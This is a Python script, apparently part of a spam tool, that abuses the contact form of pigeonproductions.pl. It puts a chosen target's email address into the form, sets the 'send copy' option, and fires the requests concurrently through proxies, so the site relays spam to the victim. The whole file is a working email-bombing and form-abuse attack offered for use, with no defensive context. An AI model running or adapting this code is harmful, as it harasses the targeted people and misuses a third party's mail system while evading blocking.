from os.path import basename

import requests

from module import Spam

cookies = {
    '_gid': 'GA1.2.565055131.1677758053',
    '_gat_gtag_UA_252882521_1': '1',
    '_ga': 'GA1.1.1866714413.1677758053',
    '_ga_268EVPMKCC': 'GS1.1.1677758052.1.1.1677758137.0.0.0',
}

headers = {
    'authority': 'www.pigeonproductions.pl',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.565055131.1677758053; _gat_gtag_UA_252882521_1=1; _ga=GA1.1.1866714413.1677758053; _ga_268EVPMKCC=GS1.1.1677758052.1.1.1677758137.0.0.0',
    'origin': 'https://www.pigeonproductions.pl',
    'pragma': 'no-cache',
    'referer': 'https://www.pigeonproductions.pl/contact/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

s = 'bool(true)'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = 'sendmessage=1&emailaddress=wezxasqw@gmail.com&message=test&fullname=test&sendcopy=true'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())

        response = requests.post('https://www.pigeonproductions.pl/', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
